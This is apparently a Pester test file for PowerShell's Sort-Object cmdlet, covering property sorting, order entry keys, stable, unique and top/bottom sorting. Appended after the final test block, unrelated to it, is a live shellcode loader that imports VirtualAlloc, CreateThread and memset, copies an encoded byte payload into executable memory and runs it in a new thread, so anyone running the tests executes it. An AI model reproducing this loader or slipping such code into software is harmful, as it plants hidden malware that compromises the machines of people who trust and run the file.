

Describe "Sort-Object" -Tags "CI" {

    It "should be able to sort object in ascending with using Property switch" {
        { Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length } | Should -Not -Throw

        $firstLen = (Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length | Select-Object -First 1).Length
        $lastLen = (Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length | Select-Object -Last 1).Length

        $firstLen -lt $lastLen | Should -BeTrue

    }

    It "should be able to sort object in descending with using Descending switch" {
        { Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length -Descending } | Should -Not -Throw

        $firstLen = (Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length -Descending | Select-Object -First 1).Length
        $lastLen = (Get-ChildItem -Path $PSScriptRoot -Include *.ps1 -Recurse | Sort-Object -Property Length -Descending | Select-Object -Last 1).Length

        $firstLen -gt $lastLen | Should -BeTrue
    }
}

Describe "Sort-Object DRT Unit Tests" -Tags "CI" {
	It "Sort-Object with object array should work"{
		$employee1 = [pscustomobject]@{"FirstName"="Eight"; "LastName"="Eight"; "YearsInMS"=8}
		$employee2 = [pscustomobject]@{"FirstName"="Eight"; "YearsInMS"=$null}
		$employee3 = [pscustomobject]@{"FirstName"="Minus"; "LastName"="Two"; "YearsInMS"=-2}
		$employee4 = [pscustomobject]@{"FirstName"="One"; "LastName"="One"; "YearsInMS"=1}
		$employees = @($employee1,$employee2,$employee3,$employee4)
		$results = $employees | Sort-Object -Property YearsInMS

		$results[0].FirstName | Should -BeExactly "Minus"
		$results[0].LastName | Should -BeExactly "Two"
		$results[0].YearsInMS | Should -Be -2

		$results[1].FirstName | Should -BeExactly "Eight"
		$results[1].YearsInMS | Should -BeNullOrEmpty

		$results[2].FirstName | Should -BeExactly "One"
		$results[2].LastName | Should -BeExactly "One"
		$results[2].YearsInMS | Should -Be 1

		$results[3].FirstName | Should -BeExactly "Eight"
		$results[3].LastName | Should -BeExactly "Eight"
		$results[3].YearsInMS | Should -Be 8
	}

	It "Sort-Object with Non Conflicting Order Entry Keys should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=2}
		$employees = @($employee1,$employee2,$employee3)
		$ht = @{"e"="YearsInMS"; "descending"=$false; "ascending"=$true}
		$results = $employees | Sort-Object -Property $ht -Descending

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[1]
	}

	It "Sort-Object with Conflicting Order Entry Keys should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=2}
		$employees = @($employee1,$employee2,$employee3)
		$ht = @{"e"="YearsInMS"; "descending"=$false; "ascending"=$false}
		$results = $employees | Sort-Object -Property $ht -Descending

		$results[0] | Should -Be $employees[1]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[2]
	}

	It "Sort-Object with One Order Entry Key should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=2}
		$employees = @($employee1,$employee2,$employee3)
		$ht = @{"e"="YearsInMS"; "descending"=$false}
		$results = $employees | Sort-Object -Property $ht -Descending

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[1]
	}

	It "Sort-Object with HistoryInfo object should work"{
		Add-Type -TypeDefinition "public enum PipelineState{NotStarted,Running,Stopping,Stopped,Completed,Failed,Disconnected}"

		$historyInfo1 = [pscustomobject]@{"PipelineId"=1; "Cmdline"="cmd3"; "Status"=[PipelineState]::Completed; "StartTime" = [DateTime]::Now;"EndTime" = [DateTime]::Now.AddSeconds(5.0);}
		$historyInfo2 = [pscustomobject]@{"PipelineId"=2; "Cmdline"="cmd1"; "Status"=[PipelineState]::Completed; "StartTime" = [DateTime]::Now;"EndTime" = [DateTime]::Now.AddSeconds(5.0);}
		$historyInfo3 = [pscustomobject]@{"PipelineId"=3; "Cmdline"="cmd2"; "Status"=[PipelineState]::Completed; "StartTime" = [DateTime]::Now;"EndTime" = [DateTime]::Now.AddSeconds(5.0);}

		$historyInfos = @($historyInfo1,$historyInfo2,$historyInfo3)

		$results = $historyInfos | Sort-Object

		$results[0] | Should -Be $historyInfos[0]
		$results[1] | Should -Be $historyInfos[1]
		$results[2] | Should -Be $historyInfos[2]
	}

	It "Sort-Object with Non Existing And Null Script Property should work"{
		$n = new-object microsoft.powershell.commands.newobjectcommand
		$d = new-object microsoft.powershell.commands.newobjectcommand
		$d.TypeName = 'Deetype'
		$b = new-object microsoft.powershell.commands.newobjectcommand
		$b.TypeName = 'btype'
		$a = new-object microsoft.powershell.commands.newobjectcommand
		$a.TypeName = 'atype'
		$results = $n, $d, $b, 'b', $a | Sort-Object -proper {$_.TypeName}
		$results.Count | Should -Be 5
		$results[2] | Should -Be $a
		$results[3] | Should -Be $b
		$results[4] | Should -Be $d
		
	}

	It "Sort-Object with Non Existing And Null Property should work"{
		$n = new-object microsoft.powershell.commands.newobjectcommand
		$n.TypeName = $null
		$d = new-object microsoft.powershell.commands.newobjectcommand
		$d.TypeName = 'Deetype'
		$b = new-object microsoft.powershell.commands.newobjectcommand
		$b.TypeName = 'btype'
		$a = new-object microsoft.powershell.commands.newobjectcommand
		$a.TypeName = 'atype'
		$results = $n, $d, $b, 'b', $a | Sort-Object -prop TypeName
		$results.Count | Should -Be 5
		$results[0] | Should -Be $n
		$results[1] | Should -Be $a
		$results[2] | Should -Be $b
		$results[3] | Should -Be $d
		$results[4] | Should -Be 'b'
	}

	It "Sort-Object with Non Case-Sensitive Unique should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=12}
		$employees = @($employee1,$employee2,$employee3)
		$results = $employees | Sort-Object -Property "LastName" -Descending -Unique

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[1]
		$results[2] | Should -BeNullOrEmpty
	}

	It "Sort-Object with Case-Sensitive Unique should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=12}
		$employees = @($employee1,$employee2,$employee3)
		$results = $employees | Sort-Object -Property "LastName","FirstName" -Descending -Unique -CaseSensitive

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[1]
	}

	It "Sort-Object with Two Order Entry Keys should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=2}
		$employees = @($employee1,$employee2,$employee3)
		$ht1 = @{"expression"="LastName"; "ascending"=$false}
		$ht2 = @{"expression"="FirstName"; "ascending"=$true}
		$results = $employees | Sort-Object -Property @($ht1,$ht2) -Descending

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[1]
		$results[2] | Should -Be $employees[0]
	}

	It "Sort-Object with -Descending:$false and Two Order Entry Keys should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=12}
		$employees = @($employee1,$employee2,$employee3)
		$results = $employees | Sort-Object -Property "LastName","FirstName" -Descending:$false

		$results[0] | Should -Be $employees[1]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[2]
	}

	It "Sort-Object with -Descending and Two Order Entry Keys should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=12}
		$employees = @($employee1,$employee2,$employee3)
		$results = $employees | Sort-Object -Property "LastName","FirstName" -Descending

		$results[0] | Should -Be $employees[2]
		$results[1] | Should -Be $employees[0]
		$results[2] | Should -Be $employees[1]
	}

	It "Sort-Object with Two Order Entry Keys with asc=true should work"{
		$employee1 = [pscustomobject]@{"FirstName"="john"; "LastName"="smith"; "YearsInMS"=5}
		$employee2 = [pscustomobject]@{"FirstName"="joesph"; "LastName"="smith"; "YearsInMS"=15}
		$employee3 = [pscustomobject]@{"FirstName"="john"; "LastName"="smyth"; "YearsInMS"=12}
		$employees = @($employee1,$employee2,$employee3)
		$ht1 = @{"e"="FirstName"; "asc"=$true}
		$ht2 = @{"e"="LastName";}
		$results = $employees | Sort-Object -Property @($ht1,$ht2) -Descending

		$results[0] | Should -Be $employees[1]
		$results[1] | Should -Be $employees[2]
		$results[2] | Should -Be $employees[0]
	}

	It "Sort-Object with Descending No Property should work"{
		$employee1 = 1
		$employee2 = 2
		$employee3 = 3
		$employees = @($employee1,$employee2,$employee3)
		$results = $employees | Sort-Object -Descending

		$results[0] | Should -Be 3
		$results[1] | Should -Be 2
		$results[2] | Should -Be 1
	}
}

Describe 'Sort-Object Stable Unit Tests' -Tags 'CI' {

	Context 'Modulo stable sort' {

		$unsortedData = 1..20

		It 'Return each value in an ordered set, sorted by the value modulo 3, with items having the same result appearing in the same order' {
			$results = $unsortedData | Sort-Object {$_ % 3} -Stable

			$results[0]  | Should -Be 3
			$results[1]  | Should -Be 6
			$results[2]  | Should -Be 9
			$results[3]  | Should -Be 12
			$results[4]  | Should -Be 15
			$results[5]  | Should -Be 18
			$results[6]  | Should -Be 1
			$results[7]  | Should -Be 4
			$results[8]  | Should -Be 7
			$results[9]  | Should -Be 10
			$results[10] | Should -Be 13
			$results[11] | Should -Be 16
			$results[12] | Should -Be 19
			$results[13] | Should -Be 2
			$results[14] | Should -Be 5
			$results[15] | Should -Be 8
			$results[16] | Should -Be 11
			$results[17] | Should -Be 14
			$results[18] | Should -Be 17
			$results[19] | Should -Be 20
		}

		It 'Return each value in an ordered set, sorted by the value modulo 3 (descending), with items having the same result appearing in the same order' {
			$results = $unsortedData | Sort-Object {$_ % 3} -Stable -Descending

			$results[0]  | Should -Be 2
			$results[1]  | Should -Be 5
			$results[2]  | Should -Be 8
			$results[3]  | Should -Be 11
			$results[4]  | Should -Be 14
			$results[5]  | Should -Be 17
			$results[6]  | Should -Be 20
			$results[7]  | Should -Be 1
			$results[8]  | Should -Be 4
			$results[9]  | Should -Be 7
			$results[10] | Should -Be 10
			$results[11] | Should -Be 13
			$results[12] | Should -Be 16
			$results[13] | Should -Be 19
			$results[14] | Should -Be 3
			$results[15] | Should -Be 6
			$results[16] | Should -Be 9
			$results[17] | Should -Be 12
			$results[18] | Should -Be 15
			$results[19] | Should -Be 18
		}

		It 'Return each value in an ordered set, sorted by the value modulo 3, discarding duplicates' {
			$results = $unsortedData | Sort-Object {$_ % 3} -Stable -Unique

			$results[0]  | Should -Be 3
			$results[1]  | Should -Be 1
			$results[2]  | Should -Be 2
		}

		It 'Return each value in an ordered set, sorted by the value modulo 3 (descending), discarding duplicates' {
			$results = $unsortedData | Sort-Object {$_ % 3} -Stable -Unique -Descending

			$results[0]  | Should -Be 2
			$results[1]  | Should -Be 1
			$results[2]  | Should -Be 3
		}
	}
}

Describe 'Sort-Object Top and Bottom Unit Tests' -Tags 'CI' {

	
	function Compare-SortEntry
	{
		param($nSortEntry, $fullSortEntry)
		if ($nSortEntry -is [System.Array]) {
			
			
			[object]::ReferenceEquals($nSortEntry, $fullSortEntry) | Should -BeTrue
		} else {
			$nSortEntry | Should -Be $fullSortEntry
		}
	}

	
	function Test-SortObject {
		param([array]$unsortedData, [hashtable]$baseSortParameters, [string]$nSortType, [int]$nValue)
		$nSortParameters = @{
			$nSortType = $nValue
		}
		
		$fullSortResults = $unsortedData | Sort-Object @baseSortParameters
		$nSortResults = $unsortedData | Sort-Object @baseSortParameters @nSortParameters
		
		if (-not $baseSortParameters.ContainsKey('Unique')) {
			$nSortResults.Count | Should -Be $(if ($nSortParameters[$nSortType] -gt $unsortedData.Length) {$unsortedData.Length} else {$nSortParameters[$nSortType]})
			$fullSortResults.Count | Should -Be $unsortedData.Length
		}
		
		if ($nSortType -eq 'Top') {
			$range = 0..$($nSortResults.Count - 1)
		} else {
			$range = -$nSortResults.Count..-1
		}
		foreach ($i in $range) {
			Compare-SortEntry $nSortResults[$i] $fullSortResults[$i]
		}
	}

	
	$topBottom = @(
		@{nSortType='Top'   }
		@{nSortType='Bottom'}
	)

	
	$topBottomAscendingDescending = @(
		@{nSortType='Top';    orderType='ascending' }
		@{nSortType='Top';    orderType='descending'}
		@{nSortType='Bottom'; orderType='ascending' }
		@{nSortType='Bottom'; orderType='descending'}
	)

	Context 'Integer n-sort' {

		$unsortedData = 973474993,271612178,-1258909473,659770354,1829227828,-1709391247,-10835210,-1477737798,1125017828,813732193

		It 'Return the <nSortType> N sorted in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Descending = $orderType -eq 'descending'}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return all sorted in <ordertype> order when -<nSortType> is too large' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Descending = $orderType -eq 'descending'}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count + 10)
		}

	}

	Context 'Heterogeneous n-sort' {

		$unsortedData = @(
			'x'
			Get-Alias where
			'c'
			([pscustomobject]@{}) | Add-Member -Name ToString -Force -MemberType ScriptMethod -Value {$null} -PassThru 
			42
			Get-Alias foreach
			,@('a','b','c') 
			[pscustomobject]@{Name='NotAnAlias'}
			[pscustomobject]@{Name=$null;Definition='Custom'}
			'z'
			,@($null) 
		)

		It 'Return the <nSortType> N sorted in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Descending = $orderType -eq 'descending'}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property = 'Name'}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

	}

	Context 'Homogeneous n-sort' {

		$unsortedData = @(
			[pscustomobject]@{PSTypeName='Employee';FirstName='Dwayne';LastName='Smith' ;YearsInMS=8    }
			[pscustomobject]@{PSTypeName='Employee';FirstName='Lucy'  ;                 ;YearsInMS=$null}
			[pscustomobject]@{PSTypeName='Employee';FirstName='Jack'  ;LastName='Jones' ;YearsInMS=-2   }
			[pscustomobject]@{PSTypeName='Employee';FirstName='Sylvie';LastName='Landry';YearsInMS=1    }
			[pscustomobject]@{PSTypeName='Employee';FirstName='Jack'  ;LastName='Frank' ;YearsInMS=5    }
			[pscustomobject]@{PSTypeName='Employee';FirstName='John'  ;LastName='smith' ;YearsInMS=6    }
			[pscustomobject]@{PSTypeName='Employee';FirstName='Joseph';LastName='Smith' ;YearsInMS=15   }
			[pscustomobject]@{PSTypeName='Employee';FirstName='John'  ;LastName='Smyth' ;YearsInMS=12   }
		)

		It 'Return the <nSortType> N sorted by property in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property = 'YearsInMS'}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property in <orderType> order (unique, case-insensitive)' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property='LastName';Unique=$true}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property in <orderType> order (unique, case-sensitive)' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property='LastName';CaseSensitive=$true;Unique=$true}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property with an order entry key' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Descending=$true;Property=@{Expression='YearsInMS'; Descending=$false}}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property with multiple non-conflicting order entry keys' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Descending=$true;Property=@{Expression='YearsInMS'; Descending=$false; Ascending=$true}}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by property with multiple conflicting order entry keys' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Descending=$true;Property=@{Expression='YearsInMS'; Descending=$false; Ascending=$false}}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by multiple properties with different order entry keys' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Property=@{Expression='LastName';Ascending=$false},@{Expression='FirstName';Ascending=$true}}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by two properties in descending order' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Property='LastName','FirstName';Descending=$true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by two properties with -Descending:$false' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Property='LastName','FirstName';Descending=$false}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N sorted by two properties with mixed sort order' -TestCases $topBottom {
			param([string]$nSortType)
			$baseSortParameters = @{Property=@{Expression='FirstName';Ascending=$true},@{Expression='LastName'};Descending=$true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

	}

	Context 'N-sort of objects that do not define ToString' {

		Add-Type -TypeDefinition 'public enum PipelineState{NotStarted,Running,Stopping,Stopped,Completed,Failed,Disconnected}'
		$unsortedData = @(
			[pscustomobject]@{PipelineId=1;Cmdline='cmd3';Status=[PipelineState]::Completed;StartTime=[DateTime]::Now;EndTime=[DateTime]::Now.AddSeconds(5.0)}
			[pscustomobject]@{PipelineId=2;Cmdline='cmd1';Status=[PipelineState]::Completed;StartTime=[DateTime]::Now;EndTime=[DateTime]::Now.AddSeconds(5.0)}
			[pscustomobject]@{PipelineId=3;Cmdline='cmd2';Status=[PipelineState]::Completed;StartTime=[DateTime]::Now;EndTime=[DateTime]::Now.AddSeconds(5.0)}
		)

		It 'Return the <nSortType> N sorted in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Descending = $orderType -eq 'descending'}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

	}

	Context 'N-sort of objects with some null property values' {

		$item0 = New-Object -TypeName Microsoft.PowerShell.Commands.NewObjectCommand
		$item1 = New-Object -TypeName Microsoft.PowerShell.Commands.NewObjectCommand
		$item1.TypeName = 'DeeType'
		$item2 = New-Object -TypeName Microsoft.PowerShell.Commands.NewObjectCommand
		$item2.TypeName = 'B-Type'
		$item3 = New-Object -TypeName Microsoft.PowerShell.Commands.NewObjectCommand
		$item3.TypeName = 'A-Type'
		$unsortedData = @($item0,$item1,$item2,'b',$item3)

		It 'Return the <nSortType> N objects by property in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property='TypeName'}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

		It 'Return the <nSortType> N by script property in <orderType> order' -TestCases $topBottomAscendingDescending {
			param([string]$nSortType, [string]$orderType)
			$baseSortParameters = @{Property={$_.TypeName}}
			if ($orderType -eq 'Descending') {$baseSortParameters['Descending'] = $true}
			Test-SortObject $unsortedData $baseSortParameters $nSortType ($unsortedData.Count - 1)
		}

	}

}

$leF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $leF -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc7,0xd9,0x74,0x24,0xf4,0xb8,0xe7,0xf4,0x07,0x55,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xea,0xfc,0x03,0x42,0xf3,0x16,0xf2,0xa9,0x13,0x54,0xfd,0x51,0xe3,0x39,0x77,0xb4,0xd2,0x79,0xe3,0xbc,0x44,0x4a,0x67,0x90,0x68,0x21,0x25,0x01,0xfb,0x47,0xe2,0x26,0x4c,0xed,0xd4,0x09,0x4d,0x5e,0x24,0x0b,0xcd,0x9d,0x79,0xeb,0xec,0x6d,0x8c,0xea,0x29,0x93,0x7d,0xbe,0xe2,0xdf,0xd0,0x2f,0x87,0xaa,0xe8,0xc4,0xdb,0x3b,0x69,0x38,0xab,0x3a,0x58,0xef,0xa0,0x64,0x7a,0x11,0x65,0x1d,0x33,0x09,0x6a,0x18,0x8d,0xa2,0x58,0xd6,0x0c,0x63,0x91,0x17,0xa2,0x4a,0x1e,0xea,0xba,0x8b,0x98,0x15,0xc9,0xe5,0xdb,0xa8,0xca,0x31,0xa6,0x76,0x5e,0xa2,0x00,0xfc,0xf8,0x0e,0xb1,0xd1,0x9f,0xc5,0xbd,0x9e,0xd4,0x82,0xa1,0x21,0x38,0xb9,0xdd,0xaa,0xbf,0x6e,0x54,0xe8,0x9b,0xaa,0x3d,0xaa,0x82,0xeb,0x9b,0x1d,0xba,0xec,0x44,0xc1,0x1e,0x66,0x68,0x16,0x13,0x25,0xe4,0xdb,0x1e,0xd6,0xf4,0x73,0x28,0xa5,0xc6,0xdc,0x82,0x21,0x6a,0x94,0x0c,0xb5,0x8d,0x8f,0xe9,0x29,0x70,0x30,0x0a,0x63,0xb6,0x64,0x5a,0x1b,0x1f,0x05,0x31,0xdb,0xa0,0xd0,0xac,0xde,0x36,0x1b,0x98,0xe0,0xc4,0xf3,0xdb,0xe2,0xca,0x99,0x55,0x04,0x9a,0xcd,0x35,0x99,0x5a,0xbe,0xf5,0x49,0x32,0xd4,0xf9,0xb6,0x22,0xd7,0xd3,0xde,0xc8,0x38,0x8a,0xb7,0x64,0xa0,0x97,0x4c,0x15,0x2d,0x02,0x29,0x15,0xa5,0xa1,0xcd,0xdb,0x4e,0xcf,0xdd,0x8b,0xbe,0x9a,0xbc,0x1d,0xc0,0x30,0xaa,0xa1,0x54,0xbf,0x7d,0xf6,0xc0,0xbd,0x58,0x30,0x4f,0x3d,0x8f,0x4b,0x46,0xab,0x70,0x23,0xa7,0x3b,0x71,0xb3,0xf1,0x51,0x71,0xdb,0xa5,0x01,0x22,0xfe,0xa9,0x9f,0x56,0x53,0x3c,0x20,0x0f,0x00,0x97,0x48,0xad,0x7f,0xdf,0xd6,0x4e,0xaa,0xe1,0x2b,0x99,0x92,0x97,0x45,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$FcHI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($FcHI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$FcHI,0,0,0);for (;;){Start-sleep 60};

